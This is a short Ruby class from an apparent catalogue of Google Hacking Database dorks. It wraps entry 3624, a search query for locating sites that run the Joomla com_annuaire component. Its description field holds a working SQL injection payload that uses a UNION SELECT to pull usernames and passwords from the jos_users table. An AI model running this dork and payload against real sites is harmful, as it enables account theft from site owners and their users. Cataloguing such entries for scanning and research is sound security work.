module Dorks
   class Dork3624 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 3624",
            ghdb_url: "https://www.exploit-db.com/ghdb/3624",
            severity: "6",
            category: "advisories_and_vulnerabilities.sqli.com-annuaire",
            publish_date: "2010-12-01",
            author: "anonymous",
            dork: <<~EDORK,
inurl:"index.php?option=com_annuaire"
EDORK
            description: <<~EDESC
SQL Injection Vulnerability: [+] vuln: http://127.0.0.1/index.php?option=com_annuaire&view=annuaire&type=cat&id=[SQLi] [+] Exploit: /**/UNION/**/ALL/**/SELECT/**/1,2,concat(username,0x3a,password),4,5,6,7,8,9,10,11,12,13/**/from/**/jos_users-- Submitter: Ashiyane Digital Security Team
EDESC
         })

      end
   end
end
